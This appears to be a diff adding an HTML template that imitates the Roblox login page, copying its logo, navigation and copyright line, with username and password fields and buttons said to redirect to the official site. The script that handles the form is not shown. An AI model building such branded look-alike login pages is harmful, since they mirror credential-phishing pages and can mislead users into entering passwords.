@@ -1,0 +1,56 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Roblox Login (Demo UI)</title>
+  <link rel="icon" href="https://1000logos.net/wp-content/uploads/2017/09/Roblox-Logo.png">
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+  <header class="top-banner">
+    <div class="logo"><img src="https://1000logos.net/wp-content/uploads/2017/09/Roblox-Logo.png" alt="Roblox"></div>
+    <nav class="nav-links">
+      <a href="#" onclick="event.preventDefault()">Charts</a>
+      <a href="#" onclick="event.preventDefault()">Marketplace</a>
+      <a href="#" onclick="event.preventDefault()">Create</a>
+      <a href="#" onclick="event.preventDefault()">Robux</a>
+    </nav>
+    <div class="search-bar"><input placeholder="Search"></div>
+  </header>
+
+  <main class="main">
+    <section class="login-card">
+      <img class="logo-large" src="https://1000logos.net/wp-content/uploads/2017/09/Roblox-Logo.png" alt="Roblox">
+      <h1>Log In</h1>
+
+      <div class="notice">
+        For your safety this site will open the <strong>official Roblox login page</strong>.
+        We will never capture or forward your password.
+      </div>
+
+      <form id="login-form" onsubmit="return onSubmit(event)">
+        <input id="username" name="username" class="input" type="text" placeholder="Username / Email / Phone" autocomplete="username">
+        <input id="password" name="password" class="input" type="password" placeholder="Password" autocomplete="current-password">
+        <div class="controls">
+          <button id="newtabBtn" class="btn" type="button">Go to Roblox Login (new tab)</button>
+          <button id="sametabBtn" class="btn btn-secondary" type="button">Go to Roblox Login (same tab)</button>
+        </div>
+      </form>
+
+      <div id="message" class="message"></div>
+
+      <div class="alt-buttons">
+        <button class="alt">Email Me a One-Time Code</button>
+        <button class="alt">Log In With Another Device</button>
+      </div>
+    </section>
+  </main>
+
+  <footer class="footer">
+    ©2025 Roblox Corporation (Demo) — This demo will redirect to the official Roblox login page.
+  </footer>
+
+  <script src="{{ url_for('static', filename='script.js') }}"></script>
+</body>
+</html>
